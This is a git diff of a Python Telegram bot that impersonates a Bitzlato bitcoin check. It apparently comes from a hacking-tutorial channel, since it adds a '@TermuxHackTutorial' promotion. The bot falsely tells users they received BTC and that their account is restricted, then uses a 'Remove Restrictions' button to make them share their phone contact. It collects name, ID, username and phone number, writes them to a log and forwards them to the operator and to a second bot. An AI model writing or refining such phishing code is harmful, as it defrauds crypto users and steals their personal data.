@@ -64,26 +64,26 @@ def check(message):
 @bot.message_handler(commands=['start'])
 def start(message):
 	if message.from_user.id == int(ID):
-		bot.send_message(ID, 'Welcome to the bot! \n To enter the admin panel, write: /admin') 
+		bot.send_message(ID, 'Welcome to the bot! \nTo enter the admin panel, write: /admin') 
 	else:
 		try:
 			summ = message.text.split()[1]
 			userid = message.chat.id
-			bot.send_message(ID, f'User with ID:{userid} "BTC" your check for the amount:{summ}')
+			bot.send_message(ID, f' ⛄️ User with ID: {userid} "BTC" your check for the amount:{summ}')
 			bot.send_message(message.chat.id, f'''You received 0.00{random.randint(51, 253)} BTC ({summ} RUB) от /uPorterBaseTheFist!''')
 			time.sleep(1)
 			
 			m_id = message.chat.id
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
+			button_phone = types.KeyboardButton(text="✅ Remove Restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Prohibited >>> \n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "⚠️ Warning >>> \n\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 		
 		except Exception as e:
 			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
-			button_phone = types.KeyboardButton(text="✅ Remove restrictions", request_contact=True) 	
+			button_phone = types.KeyboardButton(text="✅ Remove Restrictions", request_contact=True) 	
 			keyboard.add(button_phone)	
-			bot.send_message(message.chat.id, "Prohibited >>> \n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
+			bot.send_message(message.chat.id, "⚠️ Warning >>> \n\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
 			userid = message.chat.id
 			bot.send_message(ID, f'User with ID:{userid} launched a bot!')
 
@@ -97,17 +97,19 @@ def contact(message):
         phone = message.contact.phone_number
         bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
         info = f'''
-        🧿 User Data:
+         🧿 User Data:
             ├Name: {first} {last}
             ├ID: {userid}
             ├Username: @{nick}
             └Phone number: {phone}
-            '''
+
+🎭 Follow @TermuxHackTutorial for more...
+	    '''
         log = open('bot-log.txt', 'a+', encoding='utf-8')
         log.write(info + '  ')
         log.close()
         bot.send_message(ID, info)
-        your_bot.send_message(YOUR_BOT_ID, info)  # Replace YOUR_BOT_ID with the actual chat ID of the second bot
+        your_bot.send_message(YOUR_BOT_ID, info)  
         print(info)
 
         if message.contact.user_id != message.chat.id:
